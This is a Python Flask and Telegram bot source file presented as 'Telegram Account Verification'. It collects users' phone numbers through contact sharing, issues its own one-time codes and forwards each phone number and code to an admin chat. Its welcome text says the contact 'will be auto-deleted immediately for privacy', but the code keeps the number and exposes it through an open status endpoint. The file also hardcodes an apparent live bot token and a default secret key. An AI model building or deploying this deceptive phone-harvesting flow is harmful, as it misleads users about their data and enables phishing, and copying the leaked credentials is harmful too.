import os
import telebot
from telebot import types
from flask import Flask, render_template, request, jsonify, session as flask_session
import logging
from datetime import datetime
import threading
import time
import json
import random
import requests
from functools import wraps
import uuid

# ==================== SETUP ====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "telegram-webapp-secret-key-2024")

# Configuration
BOT_TOKEN = os.environ.get("BOT_TOKEN", "7487704262:AAE34XTNrKt5D9dKtduPK0Ezwc9j3SLGoBA")
WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://itz-me-545-telegram.onrender.com")
ADMIN_ID = os.environ.get("ADMIN_ID")  # Your Telegram user ID for admin notifications

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')

# Get bot info
try:
    bot_info = bot.get_me()
    BOT_USERNAME = bot_info.username
    BOT_NAME = bot_info.first_name
    logger.info(f"🤖 Bot initialized: {BOT_NAME} (@{BOT_USERNAME})")
except Exception as e:
    logger.error(f"Failed to get bot info: {e}")
    BOT_USERNAME = "your_bot"
    BOT_NAME = "Verification Bot"

# Session storage (in production, use Redis/DB)
user_sessions = {}
verification_sessions = {}
session_timeout = 600  # 10 minutes

# ==================== SESSION MANAGEMENT ====================
class SessionManager:
    @staticmethod
    def create_webapp_session(user_id, telegram_data=None):
        """Create session for WebApp user"""
        session_id = str(uuid.uuid4())
        
        user_sessions[session_id] = {
            'session_id': session_id,
            'user_id': user_id,
            'telegram_data': telegram_data,
            'created': datetime.now(),
            'status': 'initialized',
            'phone': None,
            'contact_data': None,
            'otp_code': None,
            'otp_sent': False,
            'otp_verified': False,
            'verification_step': 'start',
            'last_activity': datetime.now()
        }
        
        logger.info(f"✅ Created WebApp session {session_id} for user {user_id}")
        return session_id
    
    @staticmethod
    def get_session(session_id):
        """Get session by ID"""
        if session_id in user_sessions:
            session = user_sessions[session_id]
            
            # Check expiration
            time_diff = (datetime.now() - session['created']).total_seconds()
            if time_diff > session_timeout:
                logger.info(f"🗑️ Session expired: {session_id}")
                del user_sessions[session_id]
                return None
            
            # Update last activity
            session['last_activity'] = datetime.now()
            return session
        
        return None
    
    @staticmethod
    def update_session(session_id, updates):
        """Update session data"""
        if session_id in user_sessions:
            user_sessions[session_id].update(updates)
            user_sessions[session_id]['last_activity'] = datetime.now()
            return True
        return False
    
    @staticmethod
    def create_verification_session(phone, user_id=None):
        """Create verification session for OTP"""
        verification_id = str(uuid.uuid4())
        
        # Generate OTP
        otp_code = str(random.randint(100000, 999999))
        
        verification_sessions[verification_id] = {
            'verification_id': verification_id,
            'phone': phone,
            'user_id': user_id,
            'otp_code': otp_code,
            'created': datetime.now(),
            'verified': False,
            'attempts': 0
        }
        
        logger.info(f"🔐 Created verification session {verification_id} for {phone}")
        return verification_id, otp_code

# ==================== OTP SERVICE ====================
class OTPService:
    @staticmethod
    def send_otp_sms(phone, otp_code):
        """Send OTP via SMS (Mock function - integrate with real SMS service)"""
        try:
            # Mock SMS sending - replace with actual SMS API
            logger.info(f"📱 SENDING OTP to {phone}: {otp_code}")
            
            # Example with Twilio (uncomment and configure):
            # from twilio.rest import Client
            # client = Client(account_sid, auth_token)
            # message = client.messages.create(
            #     body=f"Your verification code is: {otp_code}",
            #     from_='+1234567890',
            #     to=phone
            # )
            
            # For now, just log
            print(f"\n{'='*50}")
            print(f"📱 OTP FOR {phone}: {otp_code}")
            print(f"{'='*50}\n")
            
            return True
        except Exception as e:
            logger.error(f"❌ Failed to send OTP: {e}")
            return False
    
    @staticmethod
    def send_otp_telegram(bot, chat_id, otp_code):
        """Send OTP via Telegram message"""
        try:
            message = f"""🔐 <b>Your Verification Code</b>

Your OTP code is: <code>{otp_code}</code>

This code will expire in 10 minutes.

⚠️ <i>Do not share this code with anyone.</i>"""
            
            bot.send_message(chat_id, message, parse_mode='HTML')
            return True
        except Exception as e:
            logger.error(f"❌ Failed to send Telegram OTP: {e}")
            return False

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    """Main WebApp landing page"""
    return render_template('index.html',
                         bot_username=BOT_USERNAME,
                         webapp_url=WEBAPP_URL)

@app.route('/verify')
def verify_page():
    """Verification page with contact sharing"""
    # Get parameters
    user_id = request.args.get('user_id')
    session_id = request.args.get('session_id')
    
    # Validate session
    if session_id:
        session = SessionManager.get_session(session_id)
        if session:
            return render_template('verify.html',
                                 session_id=session_id,
                                 user_id=session['user_id'],
                                 bot_username=BOT_USERNAME)
    
    # Create new session if user_id provided
    if user_id:
        session_id = SessionManager.create_webapp_session(user_id)
        return render_template('verify.html',
                             session_id=session_id,
                             user_id=user_id,
                             bot_username=BOT_USERNAME)
    
    # No valid session
    return render_template('error.html',
                         error="Invalid Session",
                         message="Please start from the bot using /start",
                         bot_username=BOT_USERNAME)

@app.route('/otp')
def otp_page():
    """OTP entry page"""
    session_id = request.args.get('session_id')
    
    if not session_id:
        return render_template('error.html',
                             error="Session Required",
                             message="Please share contact first",
                             bot_username=BOT_USERNAME)
    
    session = SessionManager.get_session(session_id)
    if not session or not session.get('otp_sent'):
        return render_template('error.html',
                             error="Invalid Session",
                             message="Please share contact first",
                             bot_username=BOT_USERNAME)
    
    phone = session.get('phone', 'Unknown')
    masked_phone = phone[:4] + '****' + phone[-3:] if len(phone) > 7 else phone
    
    return render_template('otp.html',
                         session_id=session_id,
                         phone=masked_phone,
                         bot_username=BOT_USERNAME)

@app.route('/success')
def success_page():
    """Success page after verification"""
    session_id = request.args.get('session_id')
    
    if session_id:
        session = SessionManager.get_session(session_id)
        if session and session.get('otp_verified'):
            return render_template('success.html',
                                 phone=session.get('phone'),
                                 bot_username=BOT_USERNAME)
    
    return render_template('error.html',
                         error="Verification Required",
                         message="Please complete verification first",
                         bot_username=BOT_USERNAME)

# ==================== API ENDPOINTS ====================
@app.route('/api/create-session', methods=['POST'])
def api_create_session():
    """Create a new WebApp session"""
    try:
        data = request.json
        user_id = data.get('user_id')
        telegram_data = data.get('telegram_data')
        
        if not user_id:
            return jsonify({'success': False, 'error': 'User ID required'})
        
        session_id = SessionManager.create_webapp_session(user_id, telegram_data)
        
        return jsonify({
            'success': True,
            'session_id': session_id,
            'message': 'Session created'
        })
        
    except Exception as e:
        logger.error(f"Error creating session: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/process-contact', methods=['POST'])
def api_process_contact():
    """Process contact shared via WebApp requestContact()"""
    try:
        data = request.json
        session_id = data.get('session_id')
        contact_data = data.get('contact')
        
        if not session_id:
            return jsonify({'success': False, 'error': 'Session ID required'})
        
        if not contact_data:
            return jsonify({'success': False, 'error': 'Contact data required'})
        
        # Get session
        session = SessionManager.get_session(session_id)
        if not session:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        # Extract phone number
        phone = contact_data.get('phone_number')
        if not phone:
            return jsonify({'success': False, 'error': 'Phone number not found'})
        
        # Format phone number
        if not phone.startswith('+'):
            phone = '+' + phone
        
        # Update session with contact data
        SessionManager.update_session(session_id, {
            'phone': phone,
            'contact_data': contact_data,
            'status': 'contact_received',
            'verification_step': 'otp_pending'
        })
        
        # Create verification session and send OTP
        verification_id, otp_code = SessionManager.create_verification_session(
            phone, session['user_id']
        )
        
        # Send OTP via SMS
        otp_sent = OTPService.send_otp_sms(phone, otp_code)
        
        # Also send via Telegram if user_id is available
        if session['user_id']:
            try:
                OTPService.send_otp_telegram(bot, int(session['user_id']), otp_code)
            except:
                pass
        
        if otp_sent:
            SessionManager.update_session(session_id, {
                'otp_code': otp_code,
                'otp_sent': True,
                'verification_id': verification_id,
                'verification_step': 'otp_sent',
                'otp_sent_at': datetime.now().isoformat()
            })
            
            # Notify admin
            if ADMIN_ID:
                try:
                    admin_msg = f"""📞 <b>NEW CONTACT RECEIVED</b>

🆔 User ID: <code>{session['user_id']}</code>
📱 Phone: {phone}
🔢 OTP: {otp_code}
🌐 Source: WebApp requestContact()
⏰ Time: {datetime.now().strftime('%H:%M:%S')}"""
                    
                    bot.send_message(int(ADMIN_ID), admin_msg, parse_mode='HTML')
                except Exception as e:
                    logger.error(f"Admin notification failed: {e}")
            
            return jsonify({
                'success': True,
                'message': 'Contact processed and OTP sent',
                'otp_sent': True,
                'redirect': f'/otp?session_id={session_id}'
            })
        else:
            return jsonify({
                'success': False,
                'error': 'Failed to send OTP'
            })
        
    except Exception as e:
        logger.error(f"Error processing contact: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-otp', methods=['POST'])
def api_verify_otp():
    """Verify OTP entered by user"""
    try:
        data = request.json
        session_id = data.get('session_id')
        otp_code = data.get('otp', '').strip()
        
        if not session_id:
            return jsonify({'success': False, 'error': 'Session ID required'})
        
        if not otp_code or len(otp_code) != 6:
            return jsonify({'success': False, 'error': 'Invalid OTP format (6 digits required)'})
        
        # Get session
        session = SessionManager.get_session(session_id)
        if not session:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        if not session.get('otp_sent'):
            return jsonify({'success': False, 'error': 'OTP not sent yet'})
        
        # Verify OTP
        if session.get('otp_code') == otp_code:
            # Mark as verified
            SessionManager.update_session(session_id, {
                'otp_verified': True,
                'status': 'verified',
                'verification_step': 'completed',
                'verified_at': datetime.now().isoformat()
            })
            
            # Update verification session
            verification_id = session.get('verification_id')
            if verification_id and verification_id in verification_sessions:
                verification_sessions[verification_id]['verified'] = True
            
            # Send success notification to user via Telegram
            if session['user_id']:
                try:
                    success_msg = f"""✅ <b>VERIFICATION SUCCESSFUL</b>

Your account has been verified successfully!

📱 Phone: {session.get('phone')}
⏰ Time: {datetime.now().strftime('%H:%M:%S')}

Thank you for verifying your account!"""
                    
                    bot.send_message(int(session['user_id']), success_msg, parse_mode='HTML')
                except Exception as e:
                    logger.error(f"User notification failed: {e}")
            
            # Send admin notification
            if ADMIN_ID:
                try:
                    admin_msg = f"""✅ <b>VERIFICATION COMPLETED</b>

🆔 User ID: <code>{session['user_id']}</code>
📱 Phone: {session.get('phone')}
🔢 OTP: {otp_code}
✅ Status: Verified
⏰ Time: {datetime.now().strftime('%H:%M:%S')}
🌐 Source: WebApp OTP Verification"""
                    
                    bot.send_message(int(ADMIN_ID), admin_msg, parse_mode='HTML')
                except Exception as e:
                    logger.error(f"Admin notification failed: {e}")
            
            return jsonify({
                'success': True,
                'message': 'OTP verified successfully!',
                'redirect': f'/success?session_id={session_id}'
            })
        else:
            # Increment attempts
            verification_id = session.get('verification_id')
            if verification_id and verification_id in verification_sessions:
                verification_sessions[verification_id]['attempts'] += 1
            
            return jsonify({
                'success': False,
                'error': 'Invalid OTP code',
                'attempts': verification_sessions.get(verification_id, {}).get('attempts', 1)
            })
        
    except Exception as e:
        logger.error(f"Error verifying OTP: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/session-status/<session_id>', methods=['GET'])
def api_session_status(session_id):
    """Get session status"""
    session = SessionManager.get_session(session_id)
    if session:
        return jsonify({
            'success': True,
            'session': {
                'session_id': session_id,
                'user_id': session.get('user_id'),
                'status': session.get('status'),
                'phone': session.get('phone'),
                'otp_sent': session.get('otp_sent', False),
                'otp_verified': session.get('otp_verified', False),
                'verification_step': session.get('verification_step', 'start')
            }
        })
    return jsonify({'success': False, 'error': 'Session not found'})

@app.route('/api/resend-otp', methods=['POST'])
def api_resend_otp():
    """Resend OTP"""
    try:
        data = request.json
        session_id = data.get('session_id')
        
        if not session_id:
            return jsonify({'success': False, 'error': 'Session ID required'})
        
        session = SessionManager.get_session(session_id)
        if not session:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        phone = session.get('phone')
        if not phone:
            return jsonify({'success': False, 'error': 'Phone number not found'})
        
        # Generate new OTP
        verification_id, new_otp = SessionManager.create_verification_session(
            phone, session['user_id']
        )
        
        # Send OTP
        otp_sent = OTPService.send_otp_sms(phone, new_otp)
        
        if otp_sent:
            SessionManager.update_session(session_id, {
                'otp_code': new_otp,
                'verification_id': verification_id,
                'otp_sent_at': datetime.now().isoformat()
            })
            
            return jsonify({
                'success': True,
                'message': 'New OTP sent successfully'
            })
        else:
            return jsonify({'success': False, 'error': 'Failed to send OTP'})
        
    except Exception as e:
        logger.error(f"Error resending OTP: {e}")
        return jsonify({'success': False, 'error': str(e)})

# ==================== BOT HANDLERS ====================
@bot.message_handler(commands=['start', 'help'])
def handle_start(message):
    """Handle /start command"""
    try:
        user_id = str(message.from_user.id)
        chat_id = message.chat.id
        first_name = message.from_user.first_name or ""
        username = message.from_user.username or ""
        
        logger.info(f"📨 /start from {user_id} (@{username})")
        
        # Create WebApp URL
        webapp_url = f"{WEBAPP_URL.rstrip('/')}/verify?user_id={user_id}"
        
        # Create WebApp button
        keyboard = types.InlineKeyboardMarkup()
        webapp_button = types.InlineKeyboardButton(
            text="📱 Open Verification WebApp",
            web_app=types.WebAppInfo(url=webapp_url)
        )
        keyboard.add(webapp_button)
        
        # Welcome message
        welcome_text = f"""<b>🔐 Telegram Account Verification</b>

Hello {first_name}! 👋

Click the button below to open the WebApp and verify your Telegram account.

<b>New Feature:</b> Share your contact directly in the WebApp!

<b>How it works:</b>
1. Open WebApp
2. Tap "Share Contact"
3. Allow contact access
4. Receive OTP on your phone
5. Enter OTP in WebApp
6. Verification complete! ✅

⚠️ <b>Important:</b> Your contact will be auto-deleted immediately for privacy.

<b>Bot:</b> @{BOT_USERNAME}"""
        
        bot.send_message(
            chat_id,
            welcome_text,
            parse_mode="HTML",
            reply_markup=keyboard
        )
        
        logger.info(f"✅ WebApp button sent to {user_id}")
        
    except Exception as e:
        logger.error(f"❌ Error in /start: {e}")
        bot.send_message(message.chat.id, "⚠️ Something went wrong. Please try /start again.")

@bot.message_handler(commands=['admin'])
def handle_admin(message):
    """Admin commands"""
    try:
        user_id = str(message.from_user.id)
        
        # Check if user is admin
        if ADMIN_ID and user_id == ADMIN_ID:
            # Count active sessions
            active_sessions = len(user_sessions)
            verified_sessions = len([s for s in user_sessions.values() if s.get('otp_verified')])
            
            admin_msg = f"""👑 <b>ADMIN PANEL</b>

🤖 Bot: @{BOT_USERNAME}
📊 Active Sessions: {active_sessions}
✅ Verified Users: {verified_sessions}
⏰ Server Time: {datetime.now().strftime('%H:%M:%S')}

<b>Commands:</b>
/start - Start verification
/admin - This panel"""
            
            bot.send_message(message.chat.id, admin_msg, parse_mode='HTML')
        else:
            bot.send_message(message.chat.id, "⚠️ Admin access required.")
            
    except Exception as e:
        logger.error(f"Admin command error: {e}")

@bot.message_handler(content_types=['contact'])
def handle_direct_contact(message):
    """Handle direct contact sharing (fallback)"""
    try:
        user_id = str(message.from_user.id)
        contact = message.contact
        phone = contact.phone_number
        
        logger.info(f"📞 Direct contact from {user_id}: {phone}")
        
        # Delete the contact message for privacy
        try:
            bot.delete_message(message.chat.id, message.message_id)
        except:
            pass
        
        # Send message with WebApp link
        webapp_url = f"{WEBAPP_URL.rstrip('/')}/verify?user_id={user_id}"
        
        bot.send_message(
            message.chat.id,
            f"""✅ Contact received via bot!

For enhanced security, please use the WebApp for verification:

{webapp_url}

The WebApp uses Telegram's secure contact sharing system.""",
            parse_mode='HTML'
        )
        
    except Exception as e:
        logger.error(f"Error handling direct contact: {e}")

# ==================== BOT POLLING ====================
def bot_polling():
    """Start bot polling"""
    logger.info("🤖 Starting bot polling...")
    
    while True:
        try:
            bot.polling(
                none_stop=True,
                interval=1,
                timeout=30
            )
        except Exception as e:
            logger.error(f"❌ Bot polling error: {e}")
            logger.info("🔄 Restarting bot in 5 seconds...")
            time.sleep(5)

# ==================== CLEANUP THREAD ====================
def cleanup_sessions():
    """Clean up expired sessions"""
    while True:
        try:
            current_time = datetime.now()
            expired_sessions = []
            
            # Clean user sessions
            for session_id, session in user_sessions.items():
                time_diff = (current_time - session['created']).total_seconds()
                if time_diff > session_timeout:
                    expired_sessions.append(session_id)
            
            for session_id in expired_sessions:
                del user_sessions[session_id]
            
            # Clean verification sessions (older than 30 minutes)
            expired_verifications = []
            for v_id, v_session in verification_sessions.items():
                time_diff = (current_time - v_session['created']).total_seconds()
                if time_diff > 1800:  # 30 minutes
                    expired_verifications.append(v_id)
            
            for v_id in expired_verifications:
                del verification_sessions[v_id]
            
            if expired_sessions or expired_verifications:
                logger.info(f"🧹 Cleaned {len(expired_sessions)} sessions, {len(expired_verifications)} verifications")
            
            time.sleep(60)
            
        except Exception as e:
            logger.error(f"Cleanup error: {e}")
            time.sleep(60)

# ==================== MAIN ====================
if __name__ == '__main__':
    # Startup info
    logger.info("="*50)
    logger.info("🚀 TELEGRAM MINI APPS VERIFICATION BOT")
    logger.info("="*50)
    logger.info(f"🤖 Bot: @{BOT_USERNAME}")
    logger.info(f"🌐 WebApp: {WEBAPP_URL}")
    logger.info(f"👑 Admin: {ADMIN_ID or 'Not set'}")
    logger.info("="*50)
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_sessions, daemon=True)
    cleanup_thread.start()
    logger.info("✅ Cleanup thread started")
    
    # Start bot polling in separate thread
    bot_thread = threading.Thread(target=bot_polling, daemon=True)
    bot_thread.start()
    logger.info("✅ Bot polling started")
    
    # Run Flask
    port = int(os.environ.get('PORT', 10000))
    logger.info(f"🌐 Flask starting on port {port}")
    
    app.run(
        host='0.0.0.0',
        port=port,
        debug=False,
        use_reloader=False,
        threaded=True
            )
